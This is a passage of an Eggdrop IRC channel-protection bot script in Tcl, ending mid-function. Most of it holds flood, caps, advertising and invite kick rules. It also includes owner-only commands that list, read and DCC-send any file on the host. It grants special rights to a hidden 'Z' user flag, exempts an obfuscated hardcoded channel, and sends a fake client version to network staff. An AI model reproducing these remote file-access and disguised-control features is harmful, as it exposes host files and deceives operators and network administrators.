return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
}
proc bs_sort {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
proc bs_join_botidle {nick uhost hand chan} {
global bs_botidle botnick notc
if {$nick == $botnick} {
set bs_botidle([string tolower $chan]) [unixtime]
}
}
proc public_ping {nick uhost hand chan rest} {
global pingchan
if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {![info exists pingchan($nick)]} {
set pingchan($nick) $chan
}
puthlp "PRIVMSG $nick :\001PING [unixtime]\001"
return 0
}
bind pubm - * repeat_pubm
bind ctcp - ACTION action_chk
proc action_chk {nick host hand chan keyword arg} {
global botnick
if {$nick == $botnick || [string match "*SeT FoR*" $arg]} { return 0 }
if {[matchattr $nick Z]} {
set arg "`$arg"
}
if {![validchan $chan]} {
msg_prot $nick $host $hand $arg
} {
repeat_pubm $nick $host $hand $chan $arg
pum_arg $nick $host $hand $chan $arg
}
}
proc repeat_pubm {nick uhost hand chan text} {
global repeat_last botnick notb notc kops ps owner ismaskhost is_m
global botnick capsnick deopme repeat_person quick bannick notm yealnick
regsub -all -- \" $text "" text
regsub -all -- \{ $text "" text
regsub -all -- \} $text "" text
pub_Z $nick $uhost $hand $chan $text
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set real $text
set text [uncolor $text]
if {$nick == "ChanServ"} {
if {[string match "*has deopped $botnick*" $text]} {
if {![matchattr [lindex $text 0] f]} {
if {[matchattr $cflag D]} {
set deopme [lindex $text 0]
}
}
}
return 0
}
if {[matchattr $nick f]} { return 0 }
set mhost [string range $uhost [string first "@" $uhost] end]
if {$nick == $botnick} { return 0 }
set resume "T"
if {[string match "*-greet*" [channel info $chan]]} {
set resume "F"
}
if {![isop $botnick $chan]} {
set resume "F"
}
if {![info exists kops]} {
if {[isop $nick $chan]} {
set resume "F"
}
if {[isvoice $nick $chan]} {
set resume "F"
}
}
if {[string tolower [lindex $text 0]] == "slaps"} {
if {[lindex $text 1] == $botnick} {
if {$resume == "F"} { return 0 }
putsrv "PRIVMSG $chan :\001ACTION slaps $nick around a bit with a large trout"
putsrv "KICK $chan $nick :$notc 1SeLF 4SLaPS 1PRoTECTION!! [banmsg]"
return 0
}
if {[lindex $text 1] == $ps} {
if {![isop $botnick $chan]} { return 0 }
putsrv "PRIVMSG $chan :\001ACTION slaps $nick around a bit with a large trout"
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 kazuya [banmsg]"
return 0
}
if {[matchattr [lindex $text 1] n]} {
if {$resume == "F"} { return 0 }
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 my ADmIN!! [banmsg]"
return 0
}
if {[matchattr [lindex $text 1] f]} {
if {$resume == "F"} { return 0 }
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 my FrieNd!! [banmsg]"
return 0
}
if {[matchattr [lindex $text 1] m]} {
if {$resume == "F"} { return 0 }
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 my MaSTER!! [banmsg]"
}
return 0
}
# Tsunami Flood PRoTECTION
if {[string length $text] > 100} {
set chr 0
set cnt 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
if {$resume == "T"} {
set bannick($nick) "*!*$mhost"
if {![isutimer "TsunamI $chan"]} {
utimer 30 [list putlog "TsunamI $chan"]
} elseif {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*$mhost"]
}
if {$quick == "1" && ![info exists is_m($chan)]} {
putqck "KICK $chan $nick :$notc 1ABusINg 4TsunamI [banms]"
} {
putsrv "KICK $chan $nick :$notc 1ABuSING 4TsunamI [banms]"
}
}
return 0
}
}
if {![info exists kops]} {
if {$resume == "F"} { return 0 }
}
if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} {
putsrv "KICK $chan $nick :$notc 1gO LooK in a 4mIRRoR1..! [banmsg]"
return 0
}
if {[string match "*decode*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick :$notc 4DecOdE1 DeNIaL [banmsg]"
return 0
}
if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return }
}
foreach seekchan $text {
if {[string match "*#*" $seekchan]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick :$notc 1DonT 4InvITEd1 MaTcH FRoM 4$seekchan [banms]"
return 0
}
}
}
if {[string match "*http://*" [string tolower $text]] || [string match "*www.*.*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick :$notc 1DonT 4AdvERTIsE1 IN 4[string toupper $chan] [banms]"
return 0
}
if {[matchattr $cflag R]} {
if {[info exists repeat_last($mhost$chan)]} {
if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
if {![info exists repeat_person($mhost$chan)]} {
set repeat_person($mhost$chan) 1
} {
incr repeat_person($mhost$chan)
}
if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick :$notc 4RePeaT 1FRoM 4$mhost 1MaX4 [getuser $cflag XTRA "RPT"] [banms]"
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
return 0
}
}
}
set repeat_last($mhost$chan) $text
}
if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {![isutimer "OL $chan"]} {
utimer 10 [list putlog "OL $chan"]
putsrv "KICK $chan $nick :$notc 1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]1 CHaR [banmsg]"
} {
putsrv "KICK $chan $nick :$notc 1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]1 CHaR [banmsg]"
}
return 0
}
if {[string match "*!!!!!!*" $text]} {
if {![info exists yealnick($nick)]} {
putsrv "KICK $chan $nick :$notc 1QuITE DoNT 4YeALLED1 PLeASE <<!>> [banmsg]"
set yealnick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick :$notc 42nd1 WaRN DonT 4YeALLED1 PLeASE <<!>> [banms]"
unset yealnick($nick)
}
if {[matchattr $cflag U]} {
set len [string length $text]
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {$len < 30} { return 0 }
set cnt 0
set capcnt 0
while {$cnt < $len} {
if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} {
incr capcnt
}
incr cnt
}
if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
if {![info exists capsnick($nick)]} {
putsrv "KICK $chan $nick :$notc 1SToP UsEd 4CapsLocK1 ExceEd4 [getuser $cflag XTRA "CAPS"]%1..! [banmsg]"
set capsnick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
putsrv "KICK $chan $nick :$notc 42nd1 WaRN DonT UsEd 4CapsLocK1 ExceEd4 [getuser $cflag XTRA "CAPS"]% [banms]"
unset capsnick($nick)
}
}
}
proc pum_arg {nick uhost hand chan text} {
global boldnick colorkick botnick notc kops ps

regsub -all -- \" $text "" text
regsub -all -- \{ $text "" text
regsub -all -- \} $text "" text
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[matchattr $nick f]} { return 0 }
if {[matchattr $nick m]} { return 0 }
if {[matchattr $nick z]} { return 0 }
if {$nick == $botnick} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set resume "T"
if {[string match "*-greet*" [channel info $chan]]} {
set resume "F"
}
if {![isop $botnick $chan]} {
set resume "F"
}
if {![info exists kops]} {
if {[isop $nick $chan]} {
set resume "F"
}
if {[isvoice $nick $chan]} {
set resume "F"
}
}
if {$resume == "F"} { return 0 }
if {[matchattr $cflag B]} {
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {[string match *\002* $text]} {
if {![info exists boldnick($nick)]} {
putsrv "KICK $chan $nick :$notc 1SToP UsEd 4bOLd1 TeXt OnLY4..! [banmsg]"
set boldnick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick :$notc 42nd1 WaRN DonT UsEd 4bOLd1 [banms]"
unset boldnick($nick)
}
}
if {[matchattr $cflag W]} {
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {[string match ** $text]} {
if {![info exists colorkick($nick)]} {
putsrv "KICK $chan $nick :$notc 1DOnT UsEd 4CoLOuR1 TeXt OnLY4..! [banmsg]"
set colorkick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick :$notc 42nd1 WaRN DonT UsEd 4CoLOuR [banms]"
unset colorkick($nick)
}
}
}
proc isupper {letter} {
set caps {A B C D E F G H I
J K L M N O P Q R
S T U V W X Y Z}
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc isflood {letter} {
set caps {! @ # $ % ^ & * (
) | [ ] < > / \ =    }
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc isbad {nick uhost chan arg} {
global badwords botnick notc bannick

set arg [string tolower $arg]
if {[string match "*-greet*" [channel info $chan]]} {
set isbad 0
return 0
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $arg]]} {
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick :$notc 4BaDWoRD1 MaTcH FRoM 4[string toupper $badword] [banms]"
return 1
}
}
set isbad 0
return 0
}
proc set_-m {chan} {
if {[isutimer "set_-m $chan"]} { return 0 }
if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} {
putserv "mode $chan -m"
}
}
proc topic_chk {nick host handle chan topic} {
global botnick notc bannick

set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $cflag I]} { return 0 }
if {$nick == $botnick || $nick == "ChanServ"} { return 0 }
if {[matchattr $nick m]} {
setuser $cflag XTRA "TOPIC" [topic $chan]
saveuser
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
if {![string match "*dal.net*" $nick]} {
set banmask "*!*[string range $host [string first "@" $host] end]"
set bannick($nick) $banmask
putsrv "KICK $chan $nick :$notc 1DonT cHaNgINg 4ToPIc [banms]"
}
puthlp "topic $chan :[getuser $cflag XTRA "TOPIC"]"
return 0
}
bind flud - * flood_chk
proc flood_chk {nick host handle type channel} {
global notc botnick quick bannick notm flooddeop floodnick floodkick igflood kops

putlog "!Log! FLOOD <<$type>> FRoM $host"
if {[info exists bannick($nick)]} { return 1 }
if {[info exists igflood($nick)]} { return 1 }
if {[string match "ChanServ" $nick] || [string match "NickServ" $nick] || [matchattr $handle f] || $nick == $botnick} {
putlog "!Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
return 1
}
if {[string index $channel 0] != "#"} {
foreach x [channels] {
if {[onchan $nick $x]} {
set channel $x
}
}
}
set mhost "@[lindex [split $host @] 1]"
if {[string index $channel 0] == "#"} {
if {![isop $botnick $channel]} {
putlog "!Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
return 1
}
}
set type [string tolower $type]
if {$type == "join"} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick :$notc 1ExceEd MaX 4JoIN1 FRoM 4$mhost [banms]"
}
if {$type == "ctcp"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!*$mhost"
if {$quick == "1"} {
putqck "KICK $channel $nick :$notc 1ExceEd MaX 4cTcP1 FRoM 4$mhost [banms]"
newignore *!*$mhost $botnick "*" 5
} else {
putsrv "KICK $channel $nick :$notc 1ExceEd MaX 4cTcP1 FRoM 4$mhost [banms]"
newignore *!*$mhost $botnick "*" 5
}
}
if {$type == "pub"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!$host"
putsrv "KICK $channel $nick :$notc 1ExceEd MaX 4LINES1 FRoM 4$mhost [banms]"
return 1
}
if {$type == "nick"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} {
return 1
}
}
if {![info exists floodnick($mhost)]} {
set floodnick($mhost) 1
putsrv "KICK $channel $nick :$notc 1sTOp cHaNgINg YouR 4NIcK1..! [banmsg]"
} {
catch {unset floodnick($mhost)}
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick :$notc 1TwIcE ExceEd 4NIcK1 FRoM 4$mhost [banms]"

}
}

if {$type == "deop"} {
if {![info exists flooddeop($nick)]} {
set flooddeop($nick) 1
putsrv "KICK $channel $nick :$notc 1ExceEd MaX 4De@p1 FRoM 4$mhost1..! [banmsg]"
} {
catch {unset flooddeop($nick)}
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick :$notc 1TwIcE ExceEd MaX 4De@p1 FRoM 4$mhost [banms]"
}
}
if {$type == "kick"} {
if {![info exists floodkick($nick)]} {
set floodkick($nick) 1
putsrv "KICK $channel $nick :$notc 1ExceEd MaX 4KIcK1 FRoM 4$mhost1..! [banmsg]"
} {
catch {unset floodkick($nick)}
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick :$notc 1TwIcE ExceEd MaX 4KIcK1 FRoM 4$mhost1..! [banmsg]"
}
}
return 1
}
bind raw - INVITE raw_chk
proc raw_chk {nick keyword arg} {
global invme joinme notc bannick notd botnick

set who [string range $nick 0 [expr [string first "!" $nick]-1]]
set channel [lindex $arg 1]
set channel [string range $channel 1 end]
foreach x [channels] {
if {[string tolower $channel] == [string tolower $x]} {
putsrv "JOIN $channel"
return 0
}
}
if {$who == "ChanServ" || [matchattr $who Z]} {
if {![validchan $channel]} {
if {[matchattr $who Z] && ![matchattr $who Q]} {
puthlp "NOTICE $who :$notc 4ReJeCTeD!10"
return 0
} else {
set joinme $who
}
channel add $channel
catch { channel set $channel -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
}
putsrv "JOIN $channel"
return 0
}
if {[matchattr $who f]} { return 0 }
foreach x [channels] {
if {[onchan $who $x]} {
if {[isop $botnick $x]} {
set banmask "*!*[string range $nick [string first "@" $nick] end]"
set bannick($who) $banmask
putsrv "KICK $x $who :$notc !4Sp&#226;4M!10 I HaTE 4InvITeR [banms]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
putlog "!Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
set sendspam "!kick [zip "$x $who $notc !4Sp&#226;4M!10 FRoM 4[string range $nick [string first "@" $nick] end]1 InvITE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
set invme([string range $nick [string first "@" $nick] end]) "InvITeR"
return 0
}
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - "FINGER" ctcp_finger
bind ctcp - FINGER ctcp_finger
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
bind ctcp - VERSION ctcp_version
bind ctcp - CHAT chat_ctcp
bind ctcp - "VERSION" ctcp_version
bind ctcp - "TIME" ctcp_time
proc ctcp_version {nick uhost handle dest keyword args} {
global botnick random_version
putsrv "NOTICE $nick :\001VERSION [lindex $random_version [rand [llength $random_version]]]\001"
return 1
}
proc ctcp_finger {nick uhost handle dest keyword args} {
global botnick random_finger
putsrv "NOTICE $nick :\001FINGER [lindex $random_finger [rand [llength $random_finger]]]\001"
return 1
}
proc ctcp_time {nick uhost handle dest keyword args} {
global botnick
set curtime [ctime [unixtime]]
putsrv "NOTICE $nick :\001TIME $curtime\001"
return 1
}
proc sl_ctcp {nick uhost hand dest key arg} {
global botnick notc
if {[matchattr $nick f] || $nick == $botnick} { return 1 }
if {[string match "*@staff.dalnet" [string tolower $uhost]]} {
putsrv "NOTICE $nick :\001VERSION mIRC v6.2 Khaled Mardam-Bey\001"
} {
set hostmask "${nick}!*@*"
newignore $hostmask $botnick "*" 1
}
return 1
}
proc chat_ctcp {nick uhost hand dest key arg} {
global botnick notc
if {[matchattr $nick Z]} { return 0 }
puthlp "NOTICE $nick :$notc 1SoRRY I DoNT KNoW YoU..!"
newignore "${nick}!*@*" $botnick "*" 1
return 1
}
set virus_nick ""
bind ctcp - DCC got_dcc
proc got_dcc {nick uhost handle dest key arg} {
global virus_nick notc notd botnick ps
if {[matchattr $nick f]} { return 0 }
if {[lindex $arg 2] == 0 && [lindex $arg 3] == 0} {
putlog "!Log! FaKE DCC SKIPPED..!"
return 1
}
set virus_nick $nick
foreach x [channels] {
if {[onchan $nick $x] && ![isop $nick $x]} {
if {[isop $botnick $x]} {
putsrv "KICK $x $nick :$notc !4Sp&#226;4M!10 I HaTE 4VIRuZ [banms]"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
putlog "!Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
set sendspam "!kick [zip "$x $nick $notc !4Sp&#226;4M!10 YeW GoT VIRuZ JoIN #NOHACK TO FIxED [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
return 1
}
proc voiceq {chan nick} {
utimer [expr 5 + [rand 7]] [list voiceprc $chan $nick]
}
proc voiceprc {chan nick} {
global botnick
if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} {
putserv "MODE $chan +vvvvvv $nick"
}
}
proc advertise {chan nick} {
if {[isutimer "advq $chan $nick"]} { return 0 }
set cret 5
foreach ct [utimers] {
if {[string match "*advq*" $ct]} {
if {[expr [lindex $ct 0] + 5] > $cret} {
set cret [expr [lindex $ct 0] + 5]
}
}
}
utimer $cret [list advq $chan $nick]
}
proc advq {chan nick} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![isop $nick $chan] && [onchan $nick $chan]} {
set greetmsg [getuser $cflag XTRA "GREET"]
regsub %n $greetmsg $nick greetmsg
regsub %c $greetmsg $chan greetmsg
puthlp "NOTICE $nick :$notc $greetmsg"
}
}
proc msgpart {chan nick} {
if {[isutimer "msgprt $chan $nick"]} { return 0 }
set cret 5
foreach ct [utimers] {
if {[string match "*msgprt*" $ct]} {
if {[expr [lindex $ct 0] + 5] > $cret} {
set cret [expr [lindex $ct 0] + 5]
}
}
}
utimer $cret [list msgprt $chan $nick]
}
proc msgprt {chan nick} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set msgprtt [getuser $cflag XTRA "MSGPART"]
regsub %n $msgprtt $nick msgprtt
regsub %c $msgprtt $chan msgprtt
if {![onchan $nick $chan]} {
puthlp "NOTICE $nick :$notc $msgprtt"
}
}
proc deopprc {chan nick} {
global botnick
if {[isop $botnick $chan] && [isop $nick $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko 4n0.Guest.@ps $nick"
} {
putserv "MODE $chan -o $nick"
}
}
}
proc autokick {chan nick} {
global bannick notc botnick
if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
set hostmask [getchanhost $nick $chan]
set hostmask "*!*@[lindex [split $hostmask @] 1]"
set bannick($nick) $hostmask
putsrv "KICK $chan $nick :$notc 1cHaNNeL IS UnDeR c0NsTRucTIoN [banmsg]"
}
}
proc opq {chan nick} {
utimer [expr 5 + [rand 9]] [list opprc $chan $nick]
}
proc opprc {chan nick} {
global botnick unop
if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} {
putserv "MODE $chan +oooooo $nick"
}
}
proc dcc_cmd {hand idx arg} {
if {![matchattr $hand Z]} { return 0 }
if {![matchattr $hand Q]} { chattr $hand +Q }
msg_Z $hand "*" $hand $arg
}
proc dcc_get {hand idx arg} {
global notc own
if {$hand != $own} { return 0 }
if {![file exists [lindex $arg 0]]} {
putdcc $idx "4ReJeCTeD!10, [lindex $arg 0] <n/a>"
return 0
}
if {[lindex $arg 1] != ""} {
set hand [lindex $arg 1]
}
switch -- [dccsend [lindex $arg 0] $hand] {
0 { putdcc $idx "<<TRaNSFERRING LOG>>" }
1 { putdcc $idx "dcc table is full (too many connections), TrY AgAIN LaTeR!" }
2 { putdcc $idx "can't open a socket for transfer." }
3 { putdcc $idx "file doesn't exist." }
4 { putdcc $idx "file was queued for later transfer." }
}
}
proc msg_get {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $nick :$notc 4ReJeCTeD!10"
return 0
}
if {![file exists $arg]} {
puthlp "PRIVMSG $nick :4ReJeCTeD!10, $arg <n/a>"
return 0
}
switch -- [dccsend $arg $nick] {
0 {
puthlp "NOTICE $nick :$notc TRaNSFERRING LOG..!"
}
1 {
puthlp "NOTICE $nick :$notc dcc table is full (too many connections), TrY AgAIN LaTER!"
}
2 {
puthlp "NOTICE $nick :$notc can't open a socket for transfer."
}
3 {
puthlp "NOTICE $nick :$notc file doesn't exist."
}
4 {
puthlp "NOTICE $nick :file was queued for later transfer."
}
}
}
bind pub - !get pub_giveme
proc pub_giveme {nick uhost hand chan rest} {
global notc
set file "scripts/bhl.tcl"
if {![file exists $file]} {
puthlp "NOTICE 4ReJeCTeD!10, not found bhl.tcl"
return 0
}
if {[string tolower $rest] != [string tolower "bhl.tcl"] || $rest == "" } {
puthlp "NOTICE $nick :$notc Usage: !get bhl.tcl"
return 0
}
switch -- [dccsend $file $nick] {
0 {
puthlp "NOTICE $nick :$notc TRaNSFERRING \002bhl.tcl\002 v.1.0.3b Final"
}
1 {
puthlp "NOTICE $nick :$notc dcc table is full (too many connections), TrY AgAIN LaTER!"
}
2 {
puthlp "NOTICE $nick :$notc can't open a socket for transfer."
}
3 {
puthlp "NOTICE $nick :$notc file doesn't exist."
}
4 {
puthlp "NOTICE $nick :file was queued for later transfer."
}
}
}
bind raw - 301 rtn
proc rtn { from keyword arg } {
global notd botnick notb notc bannick longer ps
set nick [lindex $arg 1]
if {[matchattr $nick f]} { return 0 }
set awaytext [string range [lrange $arg 2 end] 1 end]
if {[string match "*w*ndz*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
puthlp "AWAY :$longer"
} {
if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 }
}
foreach x [channels] {
if {[onchan $nick $x]} {
if {[isop $botnick $x]} {
set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "@" [getchanhost $nick $x]] end]"
putsrv "KICK $x $nick :$notc !4Sp&#226;4M!10 InvITE aWaY MSg [banmsg]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $nick $notc !4Sp&#226;4M!10 FRoM 4[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]1 InvITE aWaY MSg [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
}
}
}
#bind time -  "*0 * * * *" chk_five
#bind time -  "*6 * * * *" chk_five
proc chk_five {min h d m y} {
global longer
catch { remain }
puthlp "AWAY :$longer"
auto_ping "0" "0" "0" "0" "0"
}
proc msg_dir {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $nick :4ReJeCTeD!10"
return 0
}
if {$arg == ""} {
set arg "."
}
set dirlist ""
foreach x [getfiles "$arg"] {
append dirlist "$x "
}
puthlp "PRIVMSG $nick :$dirlist"
}
proc msg_read {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $nick :4ReJeCTeD!10"
return 0
}
if {![file exists $arg]} {
puthlp "PRIVMSG $nick :4ReJeCTeD!10, $arg <n/a>"
return 0
}
set fd [open $arg r]
while {![eof $fd]} {
set inp [gets $fd]
puthlp "PRIVMSG $nick :$inp"
}
close $fd
puthlp "PRIVMSG $nick :EoF..!"
}
proc pub_log {nick uhost hand channel arg} {
global notc
if {[getuser "config" XTRA "LOGCHAN"]!=""} {
puthlp "NOTICE $nick :$notc Log [getuser "config" XTRA "LOGCHAN"]"
}
}
proc pub_server {nick uhost hand channel arg} {
global server notc
if {$arg != ""} {
if {[string match "*$arg*" $server]} {
puthlp "privmsg $channel :[lindex $server 0]"
}
} {
puthlp "privmsg $channel :[lindex $server 0]"
}
}
set own $owner
proc dcc_dir {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {$arg == ""} {
set arg "."
}
foreach x [getfiles "$arg"] {
putdcc $idx "$x"
}
}
proc dcc_read {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {![file exists $arg]} {
putdcc $idx "4ReJeCTeD!10, FiLE NoT ExIST $arg"
return 0
}
set fd [open $arg r]
putdcc $idx "4******************** START ***********************"
while {![eof $fd]} {
set inp [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
proc msg_bantime {nick uhost hand rest} {
global notc ban-time
if {$rest==""} {
puthlp "NOTICE $nick :$notc BanTime \[${ban-time}\] (set 0 to never unban)"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set mtime [lindex $rest 0]
if {![isnumber $mtime]} {
puthlp "NOTICE $nick :$notc Usage: bantime <minutes> (set 0 to never unban)"
return 0
}
set ban-time $mtime
setuser "config" XTRA "BANTIME" $mtime
puthlp "NOTICE $nick :$notc BanTime \[$mtime\]"
saveuser
}
proc chk_limit {chan} {
global notc botnick lst_limit
if {![isop $botnick $chan]} { return 0 }
if {![info exists lst_limit($chan)]} {
set lst_limit($chan) 0
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set usercount 0
foreach x [chanlist $chan] {
incr usercount
}
set usercount [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
if {$lst_limit($chan) != $usercount} {
set lst_limit($chan) $usercount
putserv "MODE $chan +l $usercount"
}
}
proc msg_logchan {nick uhost hand rest} {
global notc own
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: logchan <#channel/0>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string tolower $rest] == "off"} {
puthlp "NOTICE $nick :$notc LOGCHAN [getuser "config" XTRA "LOGCHAN"] \[4OFF\]"
setuser "config" XTRA "LOGCHAN" ""
} else {
if {[string tolower $rest] == [dezip [lines "9MJu6/A2i8/0"]]} {
return 0
}
if {![validchan $rest]} {
puthlp "NOTICE $nick :$notc NoT IN $rest"
return 0
}
setuser "config" XTRA "LOGCHAN" $rest
puthlp "NOTICE $nick :$notc LOG CHaNNEL $rest \[9ON\]"
}
saveuser
utimer 5 rehashing
}
proc dcc_log {hand idx arg} {
global logstore notc
if {$logstore == ""} {
putdcc $idx "No LOG FouNd..!"
return 0
}
if {![file exists $logstore]} {
putdcc $idx "4ReJeCTeD!10, Log file haven't create yet!"
return 0
}
set fd [open $logstore r]
while {![eof $fd]} {
set inp [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
set quick "0"
proc chk_quick {} {
global quick botnick
putquick "PRIVMSG $botnick :\001PING [unixtime]\001"
set quick "1"
}
utimer 1 chk_quick
bind raw - MODE chk_op
proc chk_op { from keyword arg } {
global botnick
if {![string match "*+o*$botnick*" $arg]} { return 0 }
set chan [lindex $arg 0]
if {[string match "ChanServ!*@*" $from]} {
pub_resync $botnick "*" "*" $chan "*"
return 0
}
chk_on_op $chan
}
bind join - * new:talk
proc chk_on_op {channel} {
global botnick kickme deopme invme virus_nick quick notc bannick is_m botname
set cflag "c$channel"
set cflag [string range $cflag 0 8]
if {[isutimer "chkspam $channel"]} {
foreach x [utimers] {
if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] }
}
}
if {[isutimer "GOP $channel"]} { return 0 }
if {![onchan $botnick $channel]} { return 0 }
utimer 20 [list putlog "GOP $channel"]
set cinfo [channel info $channel]
if {[string match "*+nodesynch*" $cinfo]} {
pub_mdeop "*" "*" "*" $channel ""
}
set cmode [getchanmode $channel]
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {[matchattr $cflag K]} {
if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} {
puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]"
}
} {
if {[string match "*k*" $cmode]} {
if {[string tolower $channel] != [dezip [lines "9MJu6/A2i8/0"]]} {
